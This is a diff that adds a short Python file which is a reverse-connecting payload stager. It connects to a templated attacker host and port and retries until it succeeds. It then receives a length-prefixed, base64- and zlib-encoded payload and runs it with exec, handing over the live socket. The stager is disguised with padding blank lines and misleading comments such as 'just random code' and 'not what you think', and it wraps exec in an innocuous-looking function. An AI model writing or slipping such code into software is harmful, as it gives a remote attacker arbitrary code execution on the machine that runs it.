@@ -1,0 +1,30 @@
+import socket,zlib,base64,struct
+from time import sleep
+
+
+
+
+
+
+
+
+
+
+
+for x in range(10):
+	try:
+		ss=socket.socket(2,socket.SOCK_STREAM)
+                #some random text
+		ss.connect(('{host}',{port}))
+		break
+	except:
+		sleep(7)
+l=struct.unpack('>I',ss.recv(4))[0]
+d=ss.recv(l)
+while len(d)<l:
+	d+=ss.recv(l-len(d))
+#just random code
+def readd(a,b):
+    exec(a,b)
+#not what you think
+readd(zlib.decompress(base64.b64decode(d)),{'s':ss})
